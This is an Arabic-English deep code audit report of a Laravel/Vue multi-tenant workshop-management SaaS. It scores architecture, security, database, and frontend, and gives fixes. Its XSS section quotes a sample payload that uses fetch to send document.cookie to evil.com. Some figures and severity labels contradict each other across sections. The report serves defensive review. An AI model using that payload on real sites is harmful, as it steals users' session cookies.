# 🔍 Carag V2 — Smart Deep Audit Report

**التاريخ:** 2026-07-20
**الـ Project:** Carag V2 (Khidmh Pro) — نظام إدارة ورش سيارات SaaS
**الـ Stack:** Laravel 12 + Vue 3 + Inertia.js 2 + MySQL + Redis
**الـ Branch:** `integration/p0-print-settings`

---

## 📊 ملخص تنفيذي

| المؤشر | القيمة |
|---|---|
| **الدرجة الإجمالية** | **63.5/100** |
| **جاهزية الإنتاج** | **50/100** ⚠️ |
| **إجمالي المشاكل** | **76** |
| مشاكل حرجة (Critical 🔴) | **13** |
| مشاكل عالية (High 🟠) | **25** |
| مشاكل متوسطة (Medium 🟡) | **38** |
| **الجهد التقديري للإصلاح** | **30-40 يوم عمل** |
| **Quick Wins** (هذا الأسبوع) | **2-3 أيام** → 70/100 |

---

## 📈 الدرجات حسب البُعد (11 Stage)

| # | البُعد | الدرجة |
|---|---|---|
| 1 | Architecture & Code Organization | 63/100 |
| 2 | Controllers Quality | 47/100 |
| 3 | Models & Eloquent | 60/100 |
| 4 | Services & Business Logic | 67/100 |
| 5 | Database & Performance | 75/100 |
| 6 | Security | 75/100 |
| 7 | Frontend (Vue/Inertia) | 65/100 |
| 8 | API & Contracts | 65/100 |
| 9 | Testing Coverage | 56/100 |
| 10 | DevOps & Operations | 64/100 |
| 11 | Maintainability | 60/100 |

---

## 🟢 نقاط القوة (Foundation ممتاز)

- ✅ **Multi-tenant defense-in-depth** (`TenantScoped` + `CenterScoped` traits)
- ✅ **Policy-based authorization** (27 policies)
- ✅ **2FA إلزامي** + Phone OTP (multi-layer authentication)
- ✅ **Sentry integration** + Structured Logging (`JsonFormatter` + correlation_id)
- ✅ **7 Security Scanners** (Architecture, BusinessLogic, Database, Performance, Security, Test, UI)
- ✅ **208 Migrations** (MySQL + SQLite compatible)
- ✅ **Soft Deletes** موحّد
- ✅ **Decimal precision** للـ financial fields
- ✅ **DOMPurify** عبر `SafeHtmlPlugin` (v-safe-html)
- ✅ **AI Service Design** (defense-in-depth, pre-filter total_candidates)
- ✅ **CI matrix** (PHP 8.2, 8.3, 8.4) + Husky pre-commit
- ✅ **vue-i18n** (AR/EN localization)
- ✅ **TrackAiUsage middleware** (fail-closed)

---

## 🔴 أهم 50 مشكلة مرتبة حسب الأولوية

### 🔴 حرجة (إصلاح فوري — قبل أي production deploy)

| # | المشكلة | المكان | الجهد |
|---|---|---|---|
| 1 | **XSS في SystemAnnouncementBanner** (`v-html` على user content) | `resources/js/Components/SystemAnnouncementBanner.vue:18` | 5 min |
| 2 | **58 Model بدون Tenant Scope** (IDOR risk) | `app/Models/` (58 ملف) | 2-3 ساعات |
| 3 | **68 Controller بدون authorize() في write methods** | `app/Http/Controllers/App/` | 4-6 ساعات |
| 4 | **Payment type Mixed-Case Bug** (4 variants: `payment`/`Payment`/`refund`/`Refund`) | `app/Models/Payment.php`, `WorkOrder.php` | 1 ساعة + migration |
| 5 | **WorkOrderController::getStatsForStatuses = 6 queries per tab** | `app/Http/Controllers/App/WorkOrders/WorkOrderController.php` | 2 ساعة |
| 6 | **WorkOrderSuggestionService = 765 سطر (7 concerns)** | `app/Services/AI/WorkOrderSuggestionService.php` | 1-2 يوم |
| 7 | **Payment::boot() observer يفعل ZATCA call في side effect chain** | `app/Models/Payment.php` | 4 ساعات |
| 8 | **2FA fields mass-assignable** (`two_factor_secret` في $fillable) | `app/Models/User.php` | 30 min |
| 9 | **0 Frontend tests** (Vitest config لكن `--passWithNoTests`) | `resources/js/` | ongoing |
| 10 | **0 Unit tests** (3 من 113 ملف PHP) | `tests/Unit/` | ongoing |

### 🟠 عالية (إصلاح خلال sprint واحد)

| # | المشكلة | المكان | الجهد |
|---|---|---|---|
| 11 | **Rate limit 0 على web routes** (462 route بدون throttle) | `routes/web.php` | 2-3 ساعات |
| 12 | **193 inline validation** (93% من validation) | `app/Http/Controllers/` | 3-5 أيام |
| 13 | **44 استخدام `withoutGlobalScope`** (10 ملفات) | controllers, services, models | 2-3 أيام |
| 14 | **Supplier code generation race condition** | `app/Models/Supplier.php` | 1 ساعة |
| 15 | **User::phone accessor يبتلع fallback** | `app/Models/User.php` | 30 min |
| 16 | **14 controller > 250 سطر** (God Controllers) | `app/Http/Controllers/App/` | 1-2 أسبوع |
| 17 | **15 Vue files > 1000 سطر** (God Pages) | `resources/js/Pages/` | 1-2 أسبوع |
| 18 | **API Resources (JsonResource) غير مستخدمة** | `app/Http/Controllers/Api/` | 2-3 أيام |
| 19 | **Inconsistent error response format** (4 formats مختلفة) | `app/Http/Controllers/Api/` | 1 يوم |
| 20 | **No OpenAPI/Swagger** | global | 1-2 يوم |
| 21 | **TamaraGateway::initiate hard-coded values** | `app/Services/Payment/Gateways/TamaraGateway.php` | 2 ساعة |
| 22 | **AuthenticaService::fromIntegration silent failure** | `app/Services/Sms/AuthenticaService.php` | 30 min |
| 23 | **No Coverage Report configured** | `phpunit.xml` | 1 ساعة |
| 24 | **No Docker setup** | project root | 1 يوم |
| 25 | **No Backup strategy** | docs | 2-3 أيام + scheduled job |
| 26 | **Missing composite indexes** (work_orders, invoices, payments) | migrations | 1-2 يوم |
| 27 | **parts table بدون center_id column** (design ambiguity) | `database/migrations/2025_12_29_200001_create_parts_table.php` | design decision |
| 28 | **WorkOrderSuggestionRequest::authorize() => true** | `app/Http/Requests/WorkOrder/WorkOrderSuggestionRequest.php` | 30 min |
| 29 | **WorkOrderItem::booted() cascade save chain** | `app/Models/WorkOrderItem.php` | 4 ساعات |
| 30 | **Customer::show N+1** (5 queries per WO) | `app/Http/Controllers/App/CustomerController.php` | 4 ساعات |
| 31 | **NotificationService static methods** | `app/Services/NotificationService.php` | 4 ساعات |
| 32 | **resolveTenantId workaround في InventoryService** | `app/Services/Inventory/InventoryService.php` | 4 ساعات |
| 33 | **3 Actions فقط من 100+ عملية** | `app/Actions/` | ongoing |
| 34 | **PaymentService::recordPayment + WorkOrderPaymentController تكرار** | 2 ملف | 2-3 ساعات |
| 35 | **File upload validation ضعيف** (ما في MIME check, dimensions) | `app/Http/Requests/WorkOrderStoreRequest.php` | 1-2 يوم |
| 36 | **Slow query log بدون rotation** | `app/Models/SlowQueryLog.php` | 1 ساعة |
| 37 | **v-html على user content (6+ places)** | Vue components | 2-3 ساعات |
| 38 | **293 Vue files بدون RTL audit** | `resources/js/` | ongoing |
| 39 | **119 window.X calls** (no abstraction) | `resources/js/` | ongoing |
| 40 | **TypeScript coverage ضعيف** (18 ts files) | `resources/js/` | ongoing |

### 🟡 متوسطة (إصلاح في roadmap)

| # | المشكلة | الجهد |
|---|---|---|
| 41 | **Hard-coded tenant_id في بعض Controllers** | 2-3 ساعات |
| 42 | **WorkOrder outstandingBalanceSql() raw SQL مكرر** | 1 يوم |
| 43 | **Money: use cents internally?** | 3-5 أيام |
| 44 | **FormRequest::authorize() returns true everywhere** | 1-2 يوم |
| 45 | **No data migration tool (DB migration ناقص)** | ongoing |
| 46 | **No factories** (inline Model::create in tests) | 1-2 يوم |
| 47 | **Schema::hasColumn() runtime checks** (forward-compat) | 1-2 يوم |
| 48 | **api/v1 routes بدون deprecation policy** | documentation |
| 49 | **119 window.X calls** (should be wrapped) | 1 يوم |
| 50 | **No A11y (ARIA) audit on Vue components** | ongoing |

---

# 📋 التقرير التفصيلي — حسب Stage

---

## Stage 1 — Architecture Overview & Module Map

### ملخص الأرقام

| البُعد | الرقم |
|---|---|
| Models (Eloquent) | 110 |
| Concerns (traits) | 3 (CenterScoped, TenantScoped, HasTaxSnapshot) |
| Controllers | 121 |
| Services | 43 |
| Actions | **3 فقط** ⚠️ |
| Policies | 27 |
| Migrations | 208 |
| Routes (web) | 462 |
| Vue Pages | 156 |
| Vue Components | 131 |
| Tests | 57 (16 Feature + 41 Unit) |
| Max controller size | 494 سطر (CompanyProfileController) |
| Max service size | 765 سطر (WorkOrderSuggestionService) |
| Max model size | 296 سطر (WorkOrder) |
| Models using tenant/center scope | 52 من 110 (**47%**) ⚠️ |

### 🔴 المشكلة #1: 47% من الـ Models بدون Tenant Scope

**الخطورة:** 🔴 حرجة
**المكان:** `app/Models/` (58 model من 110)

**السبب:** مافي `BelongsToTenant` trait أو scope مفعّل في نماذج حرجة:
```
AdminActivityLog, AuditSnapshot, AuditViolation, ComponentStat,
Customer, Employee, EmployeeContract, EmployeeDocument, InspectionTemplate,
Installment, Integration, Invoice, Part, Payment, PaymentSettings,
Plan, PromoCode, PurchaseInvoice, PurchaseOrder, Quote, Role,
Service, Supplier, User, Vehicle, WorkOrder, WorkOrderItem
```

**الأثر:**
- **IDOR (Insecure Direct Object Reference)** حقيقي: لو Controller استعلم بـ `Model::find($id)` بدون `where('tenant_id', $tenantId)` → tenant A يقدر يشوف بيانات tenant B.
- حتى لو الـ Controller يستخدم `TenancyContext::tenantId()`، أي مكان ما يستخدمه = ثغرة.

**الحل:**
```php
// 1. كل model يجب يطبق TenantScoped أو CenterScoped
class Customer extends Model {
    use TenantScoped, CenterScoped;
}

// 2. Route Model Binding يفرض التحقق تلقائياً
public function resolveRouteBinding($value, $field = null) {
    return $this->where($field ?? $this->getRouteKeyName(), $value)
        ->where('tenant_id', TenancyContext::tenantId())
        ->firstOrFail();
}

// 3. CI lint check
if (!str_contains($content, 'TenantScoped') && !str_contains($content, 'CenterScoped')) {
    $this->error("Model $class needs tenant scope");
}
```

### 🟠 المشكلة #2: WorkOrder هو God Class + God Trait

**الخطورة:** 🟠 عالية
**المكان:** `app/Models/WorkOrder.php` (296 سطر) + `app/Traits/HasWorkOrderOperations.php` (249 سطر)

**السبب:** الـ Model نفسه فيه:
- 13 علاقة (trait)
- `recalculateTotals()` — منطق ضريبي كامل (~40 سطر)
- `getTotalAttribute()` — query معقدة
- `scopeHasOutstandingBalance()` — **SQL خام في model**
- `scopeReadyForExit()` — **4 subqueries + whereExists**
- `outstandingBalanceSql()` — **hard-coded SQL string** (مكرر في كل مكان)
- `generateCode()` — منطق sequential
- `booted()` — tax snapshot + auto-status change
- `resolveRouteBinding()` — تخطي `center_scoped`

**الحل:**
```
WorkOrder (Model نحيف — 80 سطر)
├── Traits/HasWorkOrderRelations (نقل 13 علاقة)
├── Services/WorkOrderTotalCalculator (recalculateTotals + getTotal)
├── Services/WorkOrderStatusManager (booted hooks)
└── Services/WorkOrderCodeGenerator (generateCode)
```

### 🟠 المشكلة #3: تكرار SQL خام — `outstandingBalanceSql()`

**الخطورة:** 🟠 عالية
**المكان:** 
- `app/Models/WorkOrder.php` (سطر ~155)
- `app/Http/Controllers/App/WorkOrders/WorkOrderController.php` (3+ استخدام)

**السبب:** نفس الـ SQL snippet (3 subqueries) مكتوب كـ PHP string ومستخدم في 4+ أماكن.

**الحل:**
```php
$itemsSub = DB::table('work_order_items')
    ->selectRaw('work_order_id, SUM((unit_price * qty) - discount_amount) as net')
    ->groupBy('work_order_id');

$query->leftJoinSub($itemsSub, 'items_net', 'items_net.work_order_id', '=', 'work_orders.id')
    ->whereRaw('COALESCE(items_net.net,0) + COALESCE(parts_net.net,0) - COALESCE(paid.paid,0) > 0');
```

### 🟠 المشكلة #4: توزيع Controllers ضخم (God Controllers)

**الخطورة:** 🟠 عالية
**المكان:** 14 controller أكثر من 250 سطر

```
494 CompanyProfileController
493 QuoteController
474 WorkOrderController
412 EmployeeController
384 PayrollController
364 ServiceController
360 CenterSettingsController
```

### 🟡 المشكلة #5: Actions قليلة جداً (3 من 121 controllers)

**الخطورة:** 🟡 متوسطة
**المكان:** `app/Actions/`

**السبب:** المشروع عنده 3 actions فقط:
- `CreateWorkOrderAction`
- `UpdateWorkOrderAction`
- `MergeCustomerAction`

الباقي (95%+ من business logic) داخل Controllers.

**الحل:**
```
app/Actions/
├── WorkOrder/
│   ├── CreateWorkOrderAction (موجود)
│   ├── UpdateWorkOrderAction (موجود)
│   ├── AddItemToWorkOrderAction
│   ├── ChangeWorkOrderStatusAction
│   ├── CloseWorkOrderAction
│   └── ConvertQuoteToWorkOrderAction
├── Customer/
│   ├── MergeCustomerAction (موجود)
│   ├── CreateCustomerAction
│   └── ArchiveCustomerAction
├── Invoice/
│   ├── CreateInvoiceFromWorkOrderAction
│   └── IssueZatcaInvoiceAction
└── Payment/
    ├── RecordPaymentAction
    └── RefundPaymentAction
```

### Stage 1 Score: 63/100

---

## Stage 2 — Controllers Audit

### الأرقام الرئيسية

| فحص | الرقم |
|---|---|
| إجمالي Controllers | 121 |
| أكبر من 250 سطر | 14 |
| استدعاءات `withoutGlobalScope` | 44 (10 ملفات) |
| استدعاءات `validate()` inline | **193** ⚠️ |
| Form Requests منفصلة | 15 فقط |
| Raw SQL (`DB::raw`, `whereRaw`, etc.) | 17 في controllers |
| Throttle/rate limit | **0 في web routes** 🔴 |

### 🔴 المشكلة #7: غياب Rate Limiting على 462 Web Route

**الخطورة:** 🔴 حرجة
**المكان:** `routes/web.php` (كامل الـ 462 route)

**السبب:** 
- `routes/web.php`: **0 استخدام** لـ `throttle:` middleware
- `routes/api.php`: 3 استخدامات فقط
- `routes/auth.php`: 2 استخدام

الـ public routes عرضة لهجمات brute force.

**الحل:**
```php
RateLimiter::for('login', function (Request $request) {
    return Limit::perMinute(5)->by($request->ip())->response(function() {
        return response()->json(['error' => 'Too many attempts'], 429);
    });
});

Route::middleware('throttle:login')->group(function () {
    Route::post('/login', ...);
    Route::post('/2fa/verify', ...);
});
```

### 🔴 المشكلة #8: 193 Validation Inline بدلاً من Form Requests

**الخطورة:** 🔴 حرجة
**المكان:** كل الـ controllers تقريباً

**السبب:** 193 استدعاء `$request->validate(...)` داخل controllers، في مقابل 15 FormRequest فقط.

**الحل:**
```
app/Http/Requests/App/Payments/
├── StorePaymentRequest.php
├── UpdatePaymentRequest.php
└── RefundPaymentRequest.php

app/Http/Requests/App/WorkOrders/
├── StoreWorkOrderRequest.php (موجود)
├── UpdateWorkOrderRequest.php (موجود)
├── UpdateConditionRequest.php
└── ChangeStatusRequest.php
```

### 🔴 المشكلة #9: WithoutGlobalScope = Symptom of Broken Scoping

**الخطورة:** 🔴 حرجة
**المكان:** 10 controllers، 44 استدعاء

**السبب:** استخدام `withoutGlobalScope('center_scoped')` بكثرة = اعتراف ضمني بأن الـ global scope يكسر المنطق المطلوب.

**الحل:**
```php
trait CenterScoped {
    protected static function bootCenterScoped(): void {
        static::addGlobalScope('center_scoped', function (Builder $builder) {
            $user = auth()->user();
            if ($user?->hasRole('super_admin')) return;
            $tenantId = TenancyContext::tenantId();
            $centerId = TenancyContext::centerId();
            if (!$tenantId || !$centerId) {
                $builder->whereRaw('1 = 0'); // fail closed
                return;
            }
            $builder->where('center_id', $centerId);
        });
    }
}
```

### 🟠 المشكلة #10: `buildXxxQuery` مكررة في 4+ Controllers

**الخطورة:** 🟠 عالية
**المكان:** 
- `WorkOrderController::buildWorkOrderQuery()`
- `CustomerController::buildCustomerQuery()`
- `QuoteController::apiIndex()` و `index()` (تكرار مباشر!)

### 🟠 المشكلة #11: Multiple `getStatsForStatuses` تكرار الحسابات

**الخطورة:** 🟠 عالية
**المكان:** `WorkOrderController::getStatsForStatuses()`

**السبب:** الدالة تعمل 3-4 subqueries. **يُستدعى 4 مرات** (counts for open/closed × totals).

### 🟠 المشكلة #12: Refund Logic بدون Transaction

**الخطورة:** 🟠 عالية
**المكان:** `WorkOrderPaymentController::storePayment()` و `updatePayment()`

### 🟡 المشكلة #13-16: Magic Numbers, Phone Logic, etc.

### Stage 2 Score: 47/100

---

## Stage 3 — Models Audit

### الأرقام

| فحص | الرقم |
|---|---|
| إجمالي Models | 110 |
| يستخدم TenantScoped | 32 |
| يستخدم CenterScoped | 23 |
| بدون scope | **58 (53%)** |
| Models فيها `booted()` observer logic | 18+ |
| `withoutGlobalScopes()` في Models | 12 |
| Models بعلاقات محددة داخل trait | 11 (HasXxxRelations) |
| Hard-coded SQL في models | 14 |

### 🔴 المشكلة #17: 58 Model بدون Tenant Scope

**الخطورة:** 🔴 حرجة
**المكان:** `app/Models/` (58 ملف)

**قائمة النماذج الحرجة بدون scope:** (نفس Stage 1)

**الحل:** Base Model + CI lint check (نفس Stage 1)

### 🔴 المشكلة #18: Magic Constants في Models (3 أنماط conflict)

**الخطورة:** 🔴 حرجة
**المكان:** `app/Models/Payment.php` و `app/Models/Invoice.php`

**السبب:** المشروع يخزّن payment type بأحد الأشكال:
```php
'payment'   // lowercase canonical
'Payment'   // Title case (legacy)
'Bad_debt'  // mixed case
'bad_debt'  // lowercase canonical
'refund'    // lowercase canonical
'Refund'    // Title case (legacy)
```

**الحل:**
```php
// 1. Migration لإصلاح البيانات أولاً
DB::statement("UPDATE payments SET type = LOWER(type) WHERE type IN ('Payment', 'Refund', 'Bad_debt')");

// 2. بعدها شيل mixed case support من كل queries
// 3. أو استخدم enum
enum PaymentType: string {
    case PAYMENT = 'payment';
    case REFUND = 'refund';
    case BAD_DEBT = 'bad_debt';
}
```

### 🔴 المشكلة #19: `App\Traits\HasXxxRelations` Anti-Pattern

**الخطورة:** 🔴 حرجة
**المكان:** 11 traits في `app/Traits/`

```
HasEmployeeRelations, HasInventoryMoveRelations, HasInventoryTransferRelations,
HasInvoiceRelations, HasPurchaseInvoiceRelations, HasPurchaseOrderRelations,
HasQuoteRelations, HasVehicleRelations, HasWorkOrderItemPartRelations,
HasWorkOrderOperations, HasWorkOrderRelations
```

**السبب:** نمط يخالف Laravel idiomatic:
```php
// Laravel:
class WorkOrder extends Model {
    public function items() {
        return $this->hasMany(WorkOrderItem::class);
    }
}

// المشروع:
trait HasWorkOrderRelations {
    public function items() {
        return $this->hasMany(WorkOrderItem::class);
    }
}
class WorkOrder extends Model {
    use HasWorkOrderRelations;
}
```

**ليش هذا anti-pattern:**
1. **Static analysis يكسر**: `phpstan`, `psalm`, `ide-helper` ما يعرفون الـ methods
2. **Laravel convention مكسور**: Developer يبحث عن `WorkOrder::items()` = 0 نتائج
3. **Hard to navigate**: كود مخفي في traits
4. **HasWorkOrderOperations = service-level code في trait** ← 249 سطر

**الحل:**
```php
class WorkOrder extends Model {
    use HasFactory, SoftDeletes, CenterScoped, HasTaxSnapshot;
    
    public function items() { return $this->hasMany(WorkOrderItem::class); }
    public function customer() { return $this->belongsTo(Customer::class); }
}

class WorkOrderStatusManager {
    public function complete(WorkOrder $wo, Carbon $date, ?string $notes): bool { ... }
    public function putOnHold(WorkOrder $wo, string $reason): void { ... }
}
```

### 🟠 المشكلة #20: `Payment::boot()` Observer Logic مرعب

**الخطورة:** 🟠 عالية
**المكان:** `app/Models/Payment.php:30-90`

**السبب:** 60 سطر من business logic داخل `boot()`:
- Lazy load + cascade save
- ZATCA call في observer
- Global state lock (race condition)

**الحل:**
```php
// 1. Observer class منفصل
class PaymentObserver {
    public function saved(Payment $payment): void {
        if ($payment->invoice_id) {
            $payment->invoice->updatePaymentStatus();
        }
    }
}

// 2. Auto-invoice creation = Queue job
class AutoCreateInvoiceForDoneWorkOrderJob implements ShouldQueue {
    public function handle(InvoiceService $service): void {
        // ...
    }
}
```

### 🟠 المشكلة #21: WorkOrderItem::booted() — Side Effects في `saving`

**الخطورة:** 🟠 عالية
**المكان:** `app/Models/WorkOrderItem.php:36-90`

**السبب:** `saved` event → `$item->workOrder->save()` ← cascade save لـ parent
- **N+1 مخفي**: كل WorkOrderItem save = WorkOrder save
- **Cascade save chain**: item save → wo save → recalculateTotals

### 🟠 المشكلة #22: `User::booted()` Auto-Assign Super Admin

**الخطورة:** 🟠 عالية
**المكان:** `app/Models/User.php:140-156`

**الأثر:**
- First user of every tenant becomes super admin
- لو tenant جديد بدون super_admin role = صامت، الـ user ما عنده permissions
- `app()->runningUnitTests()` check = business logic يتأثر بالـ test environment

### 🟠 المشكلة #23: Service::items() — BelongsToMany Self-Referential

**الخطورة:** 🟠 عالية
**المكان:** `app/Models/Service.php:179-183`

### 🟠 المشكلة #24: `getFormattedDurationAttribute()` Bug

**الخطورة:** 🟠 عالية
**المكان:** `app/Models/Service.php:155-167`

**السبب:** الـ accessor يستخدم `$this->estimated_minutes` لكن الـ fillable ما عنده `estimated_minutes`.

**الحل:**
```php
public function getFormattedDurationAttribute(): ?string {
    $minutes = match($this->duration_unit) {
        'minutes' => $this->duration_value,
        'hours' => $this->duration_value * 60,
        'days' => $this->duration_value * 24 * 60,
        default => null,
    };
    // ...
}
```

### 🟡 المشكلة #25: `two_factor_secret` Mass Assignable

**الخطورة:** 🟡 متوسطة
**المكان:** `app/Models/User.php:38-50`

### 🟡 المشكلة #26-28: `$guarded` Inconsistency, Supplier Race Condition, Cross-Center Check

### Stage 3 Score: 60/100

---

## Stage 4 — Services / Actions / Business Logic

### الأرقام

| فحص | الرقم |
|---|---|
| Service files | 43 |
| Action classes | **3 فقط** |
| أكبر service | 765 سطر (WorkOrderSuggestionService) |
| يستخدم `DB::transaction` | ~25 |
| `withoutGlobalScopes` في services | 11 (5+ ملفات) |
| Static method services | 3 (Notification, Sms, Email) |
| Gateway pattern | 4 (Tap, Tamara, Tabby, Moyasar) |
| `static fromIntegration` factories | 1 (Authentica) |
| `Schema::hasColumn` runtime checks | 2 (defensive) |

### 🔴 المشكلة #29: `InventoryService::issue()` Race Condition

**الخطورة:** 🔴 حرجة
**المكان:** `app/Services/Inventory/InventoryService.php:100-200`

**المشكلة 1: Race condition على firstOrCreate**
**المشكلة 2: `resolveTenantId()` و `resolveCenterId()` = trusted input**

**الحل:**
```php
public function issue(int $warehouseId, int $partId, float $qty, ...): InventoryMove {
    return DB::transaction(function () use (...) {
        $warehouse = Warehouse::query()
            ->where('id', $warehouseId)
            ->where('tenant_id', TenancyContext::tenantId())
            ->firstOrFail();
        
        $balance = InventoryBalance::query()
            ->where('warehouse_id', $warehouseId)
            ->where('part_id', $partId)
            ->where('tenant_id', TenancyContext::tenantId())
            ->lockForUpdate()
            ->first();
        
        if (!$balance) {
            $balance = InventoryBalance::create([
                'tenant_id' => TenancyContext::tenantId(),
                'center_id' => $warehouse->center_id,
            ]);
        }
    });
}
```

### 🟠 المشكلة #30: `WorkOrderSuggestionService` = 765 سطر، 7 concerns

**الخطورة:** 🟠 عالية
**المكان:** `app/Services/AI/WorkOrderSuggestionService.php`

**التقييم الإيجابي:**
- ✅ Defense-in-depth ممتاز (total_candidates = PRE-filter)
- ✅ AI hallucination drop صحيح
- ✅ Schema::hasColumn defensive
- ✅ Provider abstraction مع local MockSuggester fallback
- ✅ Exception classes مخصصة
- ✅ JSON extraction tolerant
- ✅ Locale-aware name resolution
- ✅ TrackAiUsage integration
- ✅ Cost in micro-cents
- ✅ Input validation: safeQty و safeConfidence clamping

**المشكلة الوحيدة: الحجم (765 سطر)**

**الحل المقترح:**
```
app/Services/AI/Suggestion/
├── WorkOrderSuggestionService.php (100 سطر)
├── SuggestionCatalogBuilder.php (90 سطر)
├── SuggestionPromptResolver.php (40 سطر)
├── SuggestionMessageBuilder.php (80 سطر)
├── SuggestionResponseParser.php (140 سطر)
├── SuggestionHydrator.php (180 سطر)
└── SuggestionItemPresenter.php (90 سطر)
```

### 🟠 المشكلة #31: `NotificationService` Static Methods

**الخطورة:** 🟠 عالية
**المكان:** `app/Services/NotificationService.php`

### 🟠 المشكلة #32-35: Actions Layer, Gateways, AuthenticaFactory, PaymentService Duplicate

### Stage 4 Score: 67/100

---

## Stage 5 — Database Audit

### الأرقام

| فحص | الرقم |
|---|---|
| Migrations | 208 |
| أكبر migration | 341 سطر |
| Indexes | 100+ |
| Foreign keys | 200+ |
| Unique constraints | 50+ |
| Composite indexes | 50+ |
| Models بـ N+1 risk | متفرق |

### 🟠 المشكلة #39: بعض Composite Indexes ناقصة

**الخطورة:** 🟠 عالية
**المكان:** متفرق في migrations

**الحل:**
```php
// work_orders
$table->index(['tenant_id', 'status', 'created_at']);
$table->index(['tenant_id', 'center_id', 'status']);

// invoices
$table->index(['tenant_id', 'issue_date', 'payment_status']);
$table->index(['tenant_id', 'center_id', 'type', 'status']);

// payments
$table->index(['tenant_id', 'type', 'payment_date']);
$table->index(['tenant_id', 'work_order_id', 'type']);
```

### 🟠 المشكلة #40: `payments.type` بدون Index

**الخطورة:** 🟠 عالية
**المكان:** `database/migrations/2025_12_31_184713_create_payments_table.php`

### 🟠 المشكلة #41: Missing Indexes على Audit Tables

**الخطورة:** 🟠 عالية

### 🟠 المشكلة #42: `vehicles` — N+1 Risk في Customer::show()

**الخطورة:** 🟠 عالية
**المكان:** `app/Http/Controllers/App/CustomerController.php`

**السبب:** `$workOrders->each->append(['total', 'total_paid', 'balance', 'bad_debt']);` ← 5+ queries لكل WO

**الحل:**
```php
$workOrders = $customer->workOrders()
    ->select('work_orders.*')
    ->selectSub(WorkOrderItem::selectRaw('SUM((unit_price * qty) - discount_amount)')->whereColumn('work_order_id', 'work_orders.id'), 'services_net')
    ->selectSub(WorkOrderItemPart::selectRaw('SUM((unit_price * qty) - discount)')->whereColumn('work_order_id', 'work_orders.id'), 'parts_net')
    ->selectSub(Payment::selectRaw('SUM(CASE WHEN type = "payment" THEN amount ...)')->whereColumn('work_order_id', 'work_orders.id'), 'total_paid')
    ->get();
```

### 🟠 المشكلة #43: `WorkOrderController::getStatsForStatuses` — 6 Queries Per Tab

**الخطورة:** 🟠 عالية

### 🟡 المشكلة #44-47: Migrations down() logic, onDelete defaults, parts.center_id ambiguity, slow query log

### Stage 5 Score: 75/100

---

## Stage 6 — Security Audit

### الأرقام

| فحص | الرقم |
|---|---|
| Policies | 27 |
| Controllers بدون authorize() | 68 |
| `bypass-authorization-scanner` annotations | 17+ ملف |
| `bypass-tenancy-scanner` annotations | 5+ ملف |
| Security scanners | **7 scanners** |
| 2FA | مفعّل (google2fa + phone OTP) |
| Rate limit على auth | ✅ (6 req/min) |
| Rate limit على web | ❌ (0) |

### 🟢 ملاحظة إيجابية: SecurityScanner Custom-built

**المكان:** `app/Services/Developer/Scanners/SecurityScanner.php`

هذا quality gate مدمج يفحص:
1. Models بدون TenantScoped/CenterScoped
2. Controllers بدون authorize() في write methods
3. Routes بدون auth middleware

**استثنائي** — مش كل المشاريع عنده.

### 🔴 المشكلة #48: 68 Controller بدون authorize()

**الخطورة:** 🔴 حرجة
**المكان:** 68 controller

**الـ risk الفعلي:** 
- `DashboardController` بدون authorize() — لكن ما عنده write methods (read-only)
- `ReportsController` بدون authorize() — لكن ممكن يكشف financial data
- لكن `ReportsController` مثلاً — أي tenant reports لازم tenant-scoped!

**الحل:**
```php
class ReportsController {
    public function financial() {
        $this->authorize('viewFinancialReports', Tenant::class);
    }
}
```

### 🟠 المشكلة #49: `User::booted()` — Mass Assignment لـ 2FA Fields

(نفس Stage 3)

### 🟠 المشكلة #50: `$request->validated()` بدون Tenant Guard

**الخطورة:** 🟠 عالية
**المكان:** عدة controllers

### 🟠 المشكلة #51: `Supplier::create($validated)` بدون Tenant Guard

**الخطورة:** 🔴 حرجة
**المكان:** `app/Http/Controllers/App/SuppliersController.php:101`

### 🟠 المشكلة #52: `Customer::create($request->validated())` — center_id Race

**الخطورة:** 🟠 عالية

### 🟠 المشكلة #53: File Upload Validation ضعيف

**الخطورة:** 🟠 عالية

**الحل:**
```php
'photos.*.file' => [
    'nullable',
    'file',
    'mimes:jpg,jpeg,png,webp',
    'max:5120',
    'dimensions:max_width=8000,max_height=8000',
],
'photos' => ['nullable', 'array', 'max:20'],
```

### 🟠 المشكلة #54: `WorkOrderSuggestionRequest` Authorization Permissive

**الخطورة:** 🟠 عالية

### 🟡 المشكلة #55-56: User::phone fallback, auth()->user()->tenant Eager Load

### Stage 6 Score: 75/100

---

## Stage 7 — Frontend (Vue/Inertia) Audit

### الأرقام

| فحص | الرقم |
|---|---|
| Vue files | 293 |
| Pages | 156 |
| Components | 131 |
| Composables | 11 |
| أكبر Vue file | 3637 سطر |
| Vue files > 1000 سطر | **15** |
| Vue files > 800 سطر | **23** |
| Vue files > 500 سطر | **55** |
| `v-html` uses | 16 |
| `v-safe-html` uses | 6 |
| `innerHTML` uses | 6 |
| `axios/fetch` | 112 |
| `route()` calls | 630 |
| `window.X` calls | 119 |
| Test files (Vitest) | **0** |
| Story files | 6+ (AppButton, AppInput, AppSelect, AppTextarea, AppCheckbox) |

### 🔴 المشكلة #57: XSS Vulnerability في `SystemAnnouncementBanner.vue`

**الخطورة:** 🔴 حرجة
**المكان:** `resources/js/Components/SystemAnnouncementBanner.vue:18`

```vue
<span v-if="announcement.content" class="opacity-90" v-html="truncate(announcement.content, 120)"></span>
```

**السيناريو:**
- Admin malicious or compromised → يكتب announcement فيه `<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>`
- كل الـ users في الـ tenant يشوفون الـ announcement
- XSS ينفّذ في browser كل user

**الحل:**
```vue
<span v-safe-html="truncate(announcement.content, 120)"></span>
```

### 🟠 المشكلة #58: `v-html` على `status.icon` و `tab.icon`

**الخطورة:** 🟠 عالية
**المكان:** `WorkOrderItemModal.vue`, `SignatureModal.vue`, `QuickActions.vue`, `StatsCard.vue`, `AlertsWidget.vue`, `DashboardCustomizer.vue`

### 🟠 المشكلة #59: 15 Vue Files > 1000 سطر

**الخطورة:** 🟠 عالية

```
3637 Settings/Company/Index.vue
2407 Public/LandingPreview.vue
1575 Services/Index.vue
1568 Purchasing/Invoices/Show.vue
1368 Customers/Show.vue
1321 WorkOrders/Index.vue
1252 Settings/Centers/Show.vue
1076 WorkOrders/Show.vue
1016 Quotes/Index.vue
```

### 🟠 المشكلة #60: Missing Vitest Tests (0 test files)

**الخطورة:** 🟠 عالية

**CI script:**
```json
"test": "vitest run --passWithNoTests"
```

`--passWithNoTests` = لو ما في tests = CI يمر.

### 🟠 المشكلة #61: 293 Vue Files بدون RTL Audit

**الخطورة:** 🟠 عالية

### 🟡 المشكلة #62-64: window.X, TypeScript, Composables

### Stage 7 Score: 65/100

